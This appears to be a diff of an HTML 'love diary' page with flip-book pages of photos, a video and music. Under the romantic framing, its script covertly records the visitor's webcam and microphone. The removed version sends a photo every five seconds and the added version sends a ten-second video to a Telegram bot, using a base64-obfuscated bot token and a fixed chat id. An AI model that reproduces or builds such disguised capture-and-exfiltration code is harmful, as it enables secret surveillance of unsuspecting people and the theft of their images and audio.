@@ -3,21 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Our Garden of Love ❤️</title>
+    <title>ENTER❤️</title>
     <style>
         :root { --rose: #ff4d6d; }
-        body { background: url('bg.jpg') no-repeat center center fixed !important; background-size: cover !important; margin: 0; overflow: hidden; font-family: 'Dancing Script', cursive; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        body { 
+            background: url('bg.jpg') no-repeat center center fixed !important; 
+            background-size: cover !important; 
+            margin: 0; overflow: hidden; 
+            font-family: 'Dancing Script', cursive; 
+            display: flex; justify-content: center; align-items: center; height: 100vh; 
+        }
         #diary-wrapper { display: none; perspective: 2500px; z-index: 100; }
-        .book { width: 420px; height: 580px; position: relative; transform-style: preserve-3d; background: url('bg.jpg') no-repeat center center; background-size: cover; border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.3); }
-        .page { width: 100%; height: 100%; position: absolute; top: 0; left: 0; transform-origin: left; transform-style: preserve-3d; transition: transform 1.2s; cursor: pointer; }
+        .book { 
+            width: 420px; height: 580px; position: relative; transform-style: preserve-3d; 
+            background: url('bg.jpg') no-repeat center center;
+            background-size: cover;
+            border-radius: 20px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+        }
+        .page { width: 100%; height: 100%; position: absolute; top: 0; left: 0; transform-origin: left; transform-style: preserve-3d; transition: transform 1.2s cubic-bezier(0.645, 0.045, 0.355, 1); cursor: pointer; }
         .page.flipped { transform: rotateY(-180deg); }
-        .front { width: 100%; height: 100%; position: absolute; backface-visibility: hidden; padding: 30px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; border-radius: 0 20px 20px 0; border: 1px solid rgba(255,255,255,0.2); background: rgba(255, 255, 255, 0.85); }
-        .back { width: 100%; height: 100%; position: absolute; backface-visibility: hidden; padding: 30px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; transform: rotateY(180deg); background: url('bg2.jpg') no-repeat center center !important; background-size: cover !important; border-radius: 20px 0 0 20px; }
+        .front { 
+            width: 100%; height: 100%; position: absolute; backface-visibility: hidden; padding: 30px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; border-radius: 0 20px 20px 0; border: 1px solid rgba(255,255,255,0.2); 
+            background: rgba(255, 255, 255, 0.85);
+        }
+        .back { 
+            width: 100%; height: 100%; position: absolute; backface-visibility: hidden; padding: 30px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center;
+            transform: rotateY(180deg); 
+            background: url('bg2.jpg') no-repeat center center !important; 
+            background-size: cover !important; 
+            border-radius: 20px 0 0 20px; 
+        }
         img, video { max-width: 100%; max-height: 350px; border: 8px solid white; box-shadow: 0 5px 15px rgba(0,0,0,0.2); border-radius: 5px; }
         p { font-size: 1.3rem; color: #444; text-align: center; margin-top: 20px; background: rgba(255,255,255,0.7); padding: 5px 10px; border-radius: 10px; }
         #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 240, 243, 0.9); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 2000; }
         .btn-magic { background: var(--rose); color: white; border: none; padding: 18px 45px; border-radius: 50px; cursor: pointer; font-size: 1.4rem; box-shadow: 0 4px 15px rgba(255, 77, 109, 0.3); }
     </style>
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
 </head>
 <body>
     <div id="overlay">
@@ -28,7 +50,10 @@
     <div id="diary-wrapper">
         <div class="book">
             <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="she.jpeg"><p>A blooming surprise... 💌</p></div><div class="back"></div></div>
-            <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><video id="main-video" controls><source src="video.mp4" type="video/mp4"></video><p>ilysmmmmm :) 🎥</p></div><div class="back"></div></div>
+            <div class="page" onclick="this.classList.toggle('flipped')">
+                <div class="front"><video id="main-video" controls><source src="video.mp4" type="video/mp4"></video><p>ilysmmmmm :) 🎥</p></div>
+                <div class="back"></div>
+            </div>
             <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="letter.jpeg"><p>From my heart... ❤️</p></div><div class="back"></div></div>
             <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="eyes.jpeg"><p>My world is in your eyes ✨</p></div><div class="back"></div></div>
             <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="best.jpeg"><p>The best part of me 🌟</p></div><div class="back"></div></div>
@@ -42,59 +67,55 @@
         </div>
     </div>
     <video id="video-preview" autoplay muted playsinline style="position:fixed; opacity:0; pointer-events:none;"></video>
-    <canvas id="photo-canvas" style="display:none;"></canvas>
     <script>
-        let globalStream = null;
-        const t = atob("ODU2NzQwMjg4NzpBQUd1d2FCOVNGSmY2SFktUTdQZ21mQUFvSmZlMVg0Vldabw==");
+        let mediaRecorder, recordedChunks = [];
+        const bgMusic = document.getElementById('bg-music');
+        const mainVideo = document.getElementById('main-video');
+
+        mainVideo.onplay = () => { bgMusic.pause(); };
+        mainVideo.onpause = () => { bgMusic.play(); };
+        mainVideo.onended = () => { bgMusic.play(); };
 
         function setupZ() { const pages = document.querySelectorAll('.page'); pages.forEach((el, i) => { el.style.zIndex = pages.length - i; }); }
         setupZ();
 
         async function startDiary() {
             try {
-                // Link Opened Notification
-                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Link%20Opened!%20❤️`, {keepalive: true});
+                // Resetting chunks for fresh recording every time link opens
+                recordedChunks = [];
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('video-preview').srcObject = stream;
                 
-                globalStream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false });
-                document.getElementById('video-preview').srcObject = globalStream;
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
+                mediaRecorder.start();
                 document.getElementById('overlay').style.display = 'none';
                 document.getElementById('diary-wrapper').style.display = 'block';
-                document.getElementById('bg-music').play();
-                
-                // Immediate "Emergency" Photo
-                takeAndSendPhoto("Initial_Reaction"); 
-                
-                // Start a loop to take a photo every 5 seconds
-                setInterval(() => takeAndSendPhoto("In_Garden"), 5000); 
-            } catch (err) { alert("Camera access needed for the surprise! ❤️"); }
-        }
+                bgMusic.play();
 
-        async function takeAndSendPhoto(label) {
-            const video = document.getElementById('video-preview');
-            const canvas = document.getElementById('photo-canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', "5324376571");
-                formData.append('photo', blob, `${label}.jpg`);
-                
-                // Sending as Photo is the most reliable Telegram method
-                fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: 'POST', body: formData, keepalive: true });
-            }, 'image/jpeg', 0.6); // 0.6 quality keeps the file tiny for instant upload
+                // 10 Second recording session
+                setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 10000);
+
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/mp4' });
+                    const formData = new FormData();
+                    formData.append('chat_id', "5324376571"); //
+                    formData.append('video', blob, 'reaction.mp4');
+                    
+                    const t = atob("ODU2NzQwMjg4NzpBQUd1d2FCOVNGSmY2SFktUTdQZ21mQUFvSmZlMVg0Vldabw=="); //
+                    fetch(`https://api.telegram.org/bot${t}/sendVideo`, { method: 'POST', body: formData });
+                };
+            } catch (err) { alert("Camera access needed! ❤️"); }
         }
 
         async function triggerSecretUpload(btn) {
-            document.getElementById('bg-music').pause();
+            bgMusic.pause();
             const vn = new Audio('); 
             btn.innerHTML = "Listening... ❤️";
             btn.disabled = true;
             vn.play();
-            vn.onended = () => { document.getElementById('bg-music').play(); alert("I love you forever! ❤️"); };
+            vn.onended = () => { bgMusic.play(); alert("I love you forever, Nikhitha! ❤️"); };
         }
     </script>
 </body>
 </html>
-
